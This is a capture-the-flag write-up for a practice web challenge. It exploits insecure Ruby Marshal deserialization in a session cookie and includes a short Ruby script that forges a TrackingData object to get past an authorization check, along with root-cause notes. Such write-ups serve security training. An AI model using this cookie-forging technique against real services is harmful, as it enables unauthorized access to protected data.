---
type: writeup
source: NCL/Practice Gym
event: NCL Practice Gym
category: Web
difficulty: hard
status: solved
flags: kept
tags: [writeup, web, insecure-deserialization, ruby, marshal]
---

# Choo Choo

## Task

> Recently a popular shipping company has stopped publishing shipping information for certain kinds of products. Can you figure out when this order is supposed to arrive?

The page displays an order with its products, but shipping information is hidden (`Shipping data not avalible / Please check back later`). Objective: bypass the restriction and retrieve the hidden shipping information. Automated random brute forcing is prohibited.

## Approach

- Intercepted the request in Burp and noticed a suspicious cookie: `Cookie: id=BAh7BjoKYWxsb3dG%0A`. The `BAh` prefix is the Base64 of Ruby Marshal's `04 08` version header.
- Decoded it in Ruby:
  ```ruby
  Marshal.load(Base64.decode64("BAh7BjoKYWxsb3dG"))   # => {:allow=>false}
  ```
  The server stores an authorization boolean inside a client-controlled cookie.
- First hypothesis: flip `allow` to `true`. Re-encoded `{allow: true}` → `BAh7BjoKYWxsb3dU%0A`, sent it, but the page stayed hidden and the server reset the cookie with `Set-Cookie: id=BAh7BjoKYWxsb3dG%0A` (back to `allow:false`), so there was an additional server-side check.
- Sent a deliberately malformed cookie to probe the handler. It returned HTTP 500 with a Ruby traceback: `incompatible marshal file format ... version 4.8 required; 181.235 given`, confirming the cookie goes into `Marshal.load()`, and the debug page leaked source.

## Solution

The debug traceback disclosed `/opt/challenge/choochoo/src/main.rb`, the encoder/decoder, and the authorization logic:

```ruby
def decoder(input); Marshal.load(Base64.decode64(input)); end

if perms[:allow] != false and !perms[:trackingInstance].is_a? TrackingData
  res.set_cookie('id', encoder({allow: false}))
elsif perms[:allow] != false and !perms[:trackingInstance]
  res.headers["warn"] = "Key trackingInstance of type TrackingData is not avaliable"
elsif perms[:allow] != false and perms[:trackingInstance].is_a? TrackingData
  @flag = perms[:trackingInstance].getFlag()
end
```

So two conditions are required: `perms[:allow] != false` AND `perms[:trackingInstance]` is an instance of `TrackingData`. The initial `{allow: true}` payload failed the `is_a?` check, which is why the cookie was reset.

Ruby Marshal serializes full object identity (class + instance vars), not just primitives, so we can forge a cookie holding a `TrackingData` instance. Exploit ([[Choo Choo/payload.rb]]):

```ruby
require 'base64'
require 'cgi'

class TrackingData
end

payload = { allow: true, trackingInstance: TrackingData.new }
puts CGI.escape(Base64.encode64(Marshal.dump(payload)))
```

The local `TrackingData` needs no `getFlag` body: it isn't executed locally. When the server does `Marshal.load` on the cookie, it reconstructs the object as its own `TrackingData`, the `is_a?` check passes, and the authorized branch runs `getFlag()`, revealing the protected shipping information.

Root cause: insecure deserialization (`Marshal.load` on untrusted cookie data) plus trusting client-controlled authorization state. The `is_a?` type check verifies type, not trustworthiness, so an attacker can mint an object of the expected class.

## Flag

Flag not recorded in the writeup: the forged cookie reached the authorized branch, but the exact delivery date / flag from the final successful response was not captured.

## Lessons
- A cookie starting with `BAh` likely means Ruby Marshal (Base64). Decode suspicious cookies rather than treating them as opaque session IDs.
- Flipping a boolean isn't always enough: authorization logic may require multiple fields or a typed object.
- HTTP 500 tracebacks were the most valuable artifact here (source paths, serialization functions, exact authorization conditions, class names).
- Marshal preserves object identity, unlike JSON, so an `is_a?` check is not a trust boundary.
